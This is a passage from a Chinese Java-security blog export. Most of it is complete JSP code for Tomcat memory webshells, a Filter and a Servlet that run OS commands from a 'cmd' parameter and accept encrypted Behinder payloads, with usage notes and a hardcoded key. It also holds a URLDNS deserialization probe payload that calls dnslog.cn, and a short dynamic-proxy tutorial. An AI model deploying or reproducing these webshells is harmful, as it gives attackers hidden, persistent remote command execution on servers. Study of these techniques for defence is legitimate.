                    Class Lclass = cl.getClass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }
            filterChain.doFilter(servletRequest,servletResponse);
        }

        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext){
            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
            try {

                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try {
                    uclass = cl.loadClass("U");
                } catch (ClassNotFoundException e) {
                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
                }
                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g", byte[].class);
                Um.setAccessible(true);
                String k = passwd;
                session.setAttribute("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class eclass = (Class) Um.invoke(u, eClassBytes);
                Object a = eclass.newInstance();
                Method b = eclass.getDeclaredMethod("equals", Object.class);
                b.setAccessible(true);
                b.invoke(a, pageContext);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public void destroy() {
        }
    }

    LanMyFilter lanMyFilter = new LanMyFilter();
    String filterName = "lan";
%>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(lanMyFilter.getClass().getName());
    filterDef.setFilter(lanMyFilter);
    filterDef.setAsyncSupported("true");
    standardContext.addFilterDef(filterDef);
%>

<%
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMap(filterMap);
%>

<%
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
%>

<%
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
    filterConfigs.put(filterName,filterConfig);
%>

```
### 3.2.3、Servlet
```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.util.logging.Filter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%--
/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
--%>
<%!
    public class LanServlet implements Servlet {

        String passwd = "73f50c9f17291ce9";

        @Override
        public void init(ServletConfig config) throws ServletException {
        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String command = servletRequest.getParameter("cmd");
            if (command != null){
                String system = System.getProperty("os.name");
                if (system.toLowerCase().contains("win")) {
                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                } else {
                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                }
            }

            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            HttpSession session = request.getSession();

            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);

            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

            if (request.getMethod().equals("POST")) {
                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    //从java.lang.ClassLoader中获取到Class对象
                    Class Lclass = cl.getClass().getSuperclass();
                    //调用RushThere()方法，注入内存马
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                }
            }
        }

        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
            try {

                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try {
                    uclass = cl.loadClass("U");
                } catch (ClassNotFoundException e) {
                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
                }
                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g", byte[].class);
                Um.setAccessible(true);
                String k = passwd;
                session.setAttribute("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class eclass = (Class) Um.invoke(u, eClassBytes);
                Object a = eclass.newInstance();
                Method b = eclass.getDeclaredMethod("equals", Object.class);
                b.setAccessible(true);
                b.invoke(a, pageContext);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {
        }
    }

    LanServlet lanServlet = new LanServlet();
%>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%
    String name = "lanServlet";

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(name);
    wrapper.setServlet(lanServlet);
%>

<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/lan",name);
%>

```
# 学习
https://xz.aliyun.com/t/10696#toc-4

https://github.com/ce-automne/TomcatMemShell/blob/main/DeSerialize/filter/tomcat89/IFRain.java




























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS</title>
    <url>/2023/08/22/URLDNS/</url>
    <content><![CDATA[# URLDNS
## 简述
URLDNS的作用只有一个，判断目标系统上否存在 Java 反序列化漏洞，而且不限制jdk版本
## 原理
java.util.HashMap实现了Serializeble接口且重写了readObject()方法；在反序列化的时候回调用了putVal()方法，就会触发dns请求
## 分析
首先查看HashMap类，实现了Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/fa4719a2-3e6a-4522-a189-ff2811b3aaf0.png)

然后搜索readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/74d92c61-f535-43f1-bf31-b319395bef84.png)

可以看到，这里的readObject()方法已经被重写了，而方法的最后，调用了putVal()方法，而putVal()方法又调用来了hash()方法，并传入了一个key，我们跟进hash()方法

![](https://s3.hedgedoc.org/demo/uploads/7db43df5-3b3e-4c5c-b3ed-5f25985e81a9.png)


hash()方法传入了一个key对象，最后又调用了key.hashCode()方法

而我们这个key对象，是一个URL对象，我们跟进URL.hashCode()方法

![](https://s3.hedgedoc.org/demo/uploads/85a50495-8dcb-4c1d-93de-f7f1cb187586.png)

可以看到，首先判断hashCode是否为-1，如果不是，就直接返回hashCode；如果是，就将URL对象传入handler.hashCode()方法并调用得到hashCode

![](https://s3.hedgedoc.org/demo/uploads/ef3ee57b-a18b-4984-8808-e30a9c185646.png)

而hashCode的值默认为-1，我们跟进handler.hashCode()方法

![](https://s3.hedgedoc.org/demo/uploads/c3d4e73e-f07a-4d03-a0a4-f4ee714776db.png)

这里最终传入URL对象u，并调用了getHostAddress()方法，我们跟进getHostAddress()方法

![](https://s3.hedgedoc.org/demo/uploads/8c024d04-e39e-48f0-ad88-27e13c544fdf.png)

最终，URL对象传入getHostAddress()方法，并在436行调用getByName()方法，触发了dns请求

调用链如下：
1. HashMap.readObject()
2. HashMap.putVal()
3. HashMap.hash()
4. URL.hashCode()
5. URLStreamHandler.hashCode()
6. URLStreamHandler.getHostAddress()

## payload编写逻辑
根据上面的分析，写一个简单的demo

```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws MalformedURLException {
        URL url = new URL("http://d6tzs5.dnslog.cn");
        HashMap hashMap = new HashMap();
        hashMap.put(url,"lantest");

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
            xlh.writeObject(hashMap);
            xlh.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
            fxlh.readObject();
            fxlh.close();
            fileInputStream.close();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
效果：

![](https://s3.hedgedoc.org/demo/uploads/76ec1eec-651f-46c6-9f13-4ccd84a855e3.png)

但是这里有两个dns请求，我们要的效果是在反序列化的时候触发dns请求，所以说只能有一个dns请求，不过我们在将URL对象存入HashMap对象的时候（HashMap.put()方法），也会调用HashMap.putVal()方法，而调用链的最后，也会触发dns请求，这个得规避一下

![](https://s3.hedgedoc.org/demo/uploads/58f44f15-5cf1-4148-bf64-2b19c1c3db4e.png)

根据上面的调用链分析，当进入到URL.hashCode()方法的时候，会判断URL.hashCode这个成员变量的值是否为-1，如果不等于-1，那就直接返回hashCode的值（-1），就不会进行接下来的dns请求

![](https://s3.hedgedoc.org/demo/uploads/6856989b-d8d0-43b2-9c20-63ed354ed144.png)

不过我们查看URL.hashCode这个成员变量，是用private修饰，无法直接改，只能用反射修改

```
try {
    Class uClass = Class.forName("java.net.URL");
    Field field = uClass.getDeclaredField("hashCode");
    field.setAccessible(true);
    //设置URL.hashCode的值为666，这样就不会进入请求dns的调用链
    field.set(url,666);
}catch (Exception e) {
    e.printStackTrace();
}

```

还有个问题，将URL对象添加到HashMap对象后，需要正常的进入后面的dns请求的调用链，所以我们还要将URL.hashCode的值改回来

```
field.set(field,-1);
```
## 完整代码
```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws MalformedURLException {
        URL url = new URL("http://ed1se9.dnslog.cn");
        HashMap hashMap = new HashMap();

        try {
            Class uClass = Class.forName("java.net.URL");
            Field field = uClass.getDeclaredField("hashCode");
            field.setAccessible(true);
            //设置URL.hashCode的值为666，这样就不会进入请求dns的调用链
            field.set(url,666);
            hashMap.put(url, "lantest");
            field.set(url,-1);

            FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
            xlh.writeObject(hashMap);
            xlh.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
            fxlh.readObject();
            fxlh.close();
            fileInputStream.close();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>动态代理</title>
    <url>/2023/08/22/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[# 动态代理
通过java.lang.reflect.Proxy和java.lang.reflect.InvocationHandler即可实现

被代理的那个类必须要先实现java.lang.reflect.InvocationHandler类才行

```
//被代理的类

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

public class UserInformaiton implements InvocationHandler {

    protected Map map;

    public UserInformaiton(Map map) {
        this.map = map;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("不管你执行代理类的哪个方法，都会调用被代理类的invoke()方法");
        return null;
    }
}


```

```
//代理类

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class ProxyTest {
    public static void main(String[] args) {
        Map map = new HashMap();
        InvocationHandler handler = new UserInformaiton(map);
        Map proxyString = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler);

        proxyString.put("name","maniubi");
    }
}


```
效果
![](https://s3.hedgedoc.org/demo/uploads/233bd94d-9b44-4839-9122-e7fcc3d4af7d.png)
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>零碎知识</tag>
      </tags>
  </entry>
</search>
